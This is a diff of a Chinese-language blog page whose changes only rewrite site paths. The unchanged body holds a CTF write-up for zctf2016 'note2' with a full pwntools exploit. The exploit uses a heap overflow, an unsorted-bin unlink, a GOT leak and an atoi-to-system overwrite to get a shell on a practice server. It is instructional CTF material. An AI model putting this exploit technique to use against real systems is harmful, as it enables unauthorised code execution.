@@ -5,39 +5,39 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/ha1vk/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
   <meta name="description" content="首先，检查一下程序的保护机制  然后用IDA分析一下，在edit函数里存在一个溢出漏洞，我们只需要让v6-strlen(&amp;dest) &#x3D;&#x3D; 0，即可绕过’\0’的截断，实现溢出。因此我们只需add(0,’’)，即可利用这个chunk来溢出，由于PIE也没开启并且堆指针保存在bss段，因此做unsorted bin unlink比较简单。   需要注意的是由于使用了str">
 <meta property="og:type" content="article">
 <meta property="og:title" content="zctf2016-note2">
-<meta property="og:url" content="https://github.com/ha1vk/2020/04/17/zctf2016-note2/index.html">
+<meta property="og:url" content="https://github.com/2020/04/17/zctf2016-note2/index.html">
 <meta property="og:site_name" content="ha1vk&#39;s blog">
 <meta property="og:description" content="首先，检查一下程序的保护机制  然后用IDA分析一下，在edit函数里存在一个溢出漏洞，我们只需要让v6-strlen(&amp;dest) &#x3D;&#x3D; 0，即可绕过’\0’的截断，实现溢出。因此我们只需add(0,’’)，即可利用这个chunk来溢出，由于PIE也没开启并且堆指针保存在bss段，因此做unsorted bin unlink比较简单。   需要注意的是由于使用了str">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://github.com/ha1vk/2020/04/17/zctf2016-note2/1.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/04/17/zctf2016-note2/2.png">
+<meta property="og:image" content="https://github.com/2020/04/17/zctf2016-note2/1.png">
+<meta property="og:image" content="https://github.com/2020/04/17/zctf2016-note2/2.png">
 <meta property="article:published_time" content="2020-04-17T13:10:00.000Z">
 <meta property="article:modified_time" content="2025-06-20T13:43:03.572Z">
 <meta property="article:author" content="ha1vk">
 <meta property="article:tag" content="unlink">
 <meta property="article:tag" content="unsorted bin">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/ha1vk/2020/04/17/zctf2016-note2/1.png">
+<meta name="twitter:image" content="https://github.com/2020/04/17/zctf2016-note2/1.png">
 
-<link rel="canonical" href="https://github.com/ha1vk/2020/04/17/zctf2016-note2/">
+<link rel="canonical" href="https://github.com/2020/04/17/zctf2016-note2/">
 
 
 <script id="page-configurations">
@@ -99,7 +99,7 @@
 
   <div class="site-meta">
 
-    <a href="/ha1vk/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">ha1vk's blog</h1>
       <span class="logo-line-after"><i></i></span>
@@ -120,27 +120,27 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
 
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
 
   </li>
         <li class="menu-item menu-item-about">
 
-    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -198,10 +198,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/04/17/zctf2016-note2/">
+    <link itemprop="mainEntityOfPage" href="https://github.com/2020/04/17/zctf2016-note2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="ha1vk">
       <meta itemprop="description" content="">
     </span>
@@ -236,7 +236,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                 </span>
             </span>
 
@@ -259,9 +259,9 @@
 
       
         <p>首先，检查一下程序的保护机制</p>
-<img src="/ha1vk/2020/04/17/zctf2016-note2/1.png" class="" title="1.png">
+<img src="/2020/04/17/zctf2016-note2/1.png" class="" title="1.png">
 <p>然后用IDA分析一下，在edit函数里存在一个溢出漏洞，我们只需要让v6-strlen(&amp;dest) &#x3D;&#x3D; 0，即可绕过’\0’的截断，实现溢出。因此我们只需add(0,’’)，即可利用这个chunk来溢出，由于PIE也没开启并且堆指针保存在bss段，因此做unsorted bin unlink比较简单。</p>
-<img src="/ha1vk/2020/04/17/zctf2016-note2/2.png" class="" title="2.png">
+<img src="/2020/04/17/zctf2016-note2/2.png" class="" title="2.png">
 
 <p><strong>需要注意的是由于使用了strcpy函数，因此，我们布置64位数据时，必须从最后一个开始，前面用正常不截断的字符填充，逐步向前来布置多个64位数据。</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&#x27;./note2&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25799</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./note2&#x27;</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your name:&#x27;</span>,<span class="string">&#x27;haivk&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your address:&#x27;</span>,<span class="string">&#x27;huse&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;(less than 128)&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input the note content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input the id of the note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content,mode=<span class="number">1</span></span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input the id of the note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;[1.overwrite/2.append]&#x27;</span>,<span class="built_in">str</span>(mode))</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;TheNewContents:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input the id of the note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">heap_ptr_1 = <span class="number">0x0000000000602120</span></span><br><span class="line"><span class="comment">#prev_size size</span></span><br><span class="line">fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x81</span> + <span class="number">0x20</span>)</span><br><span class="line"><span class="comment">#fd、bk</span></span><br><span class="line">fake_chunk += p64(heap_ptr_1 - <span class="number">0x18</span>) + p64(heap_ptr_1 - <span class="number">0x10</span>)</span><br><span class="line">fake_chunk += <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,fake_chunk) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x20</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过1溢出，修改chunk2的头数据</span></span><br><span class="line"><span class="comment">#修改chunk1的prev_size</span></span><br><span class="line"><span class="comment">#由于strncat遇0截断，因此，写prev_size和size的时候，我们分两步，从后往前写</span></span><br><span class="line"><span class="comment">#第一次写size为0x90，即设置prev_inuse为0标记前面的chunk为空闲状态</span></span><br><span class="line">payload = <span class="string">&#x27;d&#x27;</span>*<span class="number">0x10</span> + <span class="string">&#x27;d&#x27;</span>*<span class="number">0x8</span> + p8(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"><span class="comment">#第二次写prev_size，需要先清零prev_size处其他的d数据</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">   payload = <span class="string">&#x27;d&#x27;</span>*<span class="number">0x10</span> + <span class="string">&#x27;d&#x27;</span>*i</span><br><span class="line">   edit(<span class="number">1</span>,payload)</span><br><span class="line"><span class="comment">#现在写prev_size，写为0x20 + 0x80</span></span><br><span class="line">payload = <span class="string">&#x27;d&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0x20</span> + <span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"><span class="comment">#unsorted bin unlink</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#现在可以控制堆指针数组了</span></span><br><span class="line"><span class="comment">#第一次，我们先将heap[0]改成heap数组本身的地址+8，进而下一次利用</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(heap_ptr_1 + <span class="number">8</span>))</span><br><span class="line"><span class="comment">#修改heap[1]为atoi_got</span></span><br><span class="line">payload = p64(atoi_got)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"><span class="comment">#泄露atoi地址</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Content is &#x27;</span>)</span><br><span class="line">atoi_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = atoi_addr - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr=&#x27;</span>,<span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="comment">#修改atoi的got表为system地址</span></span><br><span class="line">edit(<span class="number">1</span>,p64(system_addr))</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
@@ -274,8 +274,8 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/ha1vk/tags/unlink/" rel="tag"># unlink</a>
-              <a href="/ha1vk/tags/unsorted-bin/" rel="tag"># unsorted bin</a>
+              <a href="/tags/unlink/" rel="tag"># unlink</a>
+              <a href="/tags/unsorted-bin/" rel="tag"># unsorted bin</a>
           </div>
 
         
@@ -284,11 +284,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/04/17/PicoCTF_2018_are_you_root/" rel="prev" title="PicoCTF_2018_are_you_root">
+    <a href="/2020/04/17/PicoCTF_2018_are_you_root/" rel="prev" title="PicoCTF_2018_are_you_root">
       <i class="fa fa-chevron-left"></i> PicoCTF_2018_are_you_root
     </a></div>
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/04/17/zctf2016-note3/" rel="next" title="zctf2016-note3">
+    <a href="/2020/04/17/zctf2016-note3/" rel="next" title="zctf2016-note3">
       zctf2016-note3 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -360,20 +360,20 @@
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/ha1vk/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">233</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-            <a href="/ha1vk/categories/">
+            <a href="/categories/">
           
         <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-            <a href="/ha1vk/tags/">
+            <a href="/tags/">
           
         <span class="site-state-item-count">145</span>
         <span class="site-state-item-name">标签</span></a>
@@ -446,30 +446,30 @@
   </div>
 
   
-  <script src="/ha1vk/lib/anime.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/ha1vk/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/ha1vk/js/motion.js"></script>
-
-
-<script src="/ha1vk/js/schemes/muse.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/ha1vk/js/next-boot.js"></script>
+<script src="/js/schemes/muse.js"></script>
 
 
-
-
-  
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
-<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
 
 
 
